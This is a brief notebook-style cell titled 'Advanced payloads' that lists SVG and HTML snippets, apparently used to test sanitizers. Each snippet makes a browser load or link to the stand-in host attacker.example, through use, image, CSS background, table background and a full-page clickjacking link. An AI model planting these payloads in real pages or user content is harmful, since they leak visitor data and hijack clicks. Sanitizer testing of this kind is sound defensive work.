# %%
# Advanced payloads
# Out:
# <svg><use href="http://attacker.example/exfil"></use></svg>
# <svg><style>*{background:url(http://attacker.example/css)}</style><rect/></svg>
# <svg><image href="http://attacker.example/img" width="100" height="100"/></svg>
# <svg><a href="http://attacker.example/click" target="_top"><rect width="100%" height="100%" fill="red"/></a></svg>
# <table><td background="http://attacker.example/table">test</td></table>
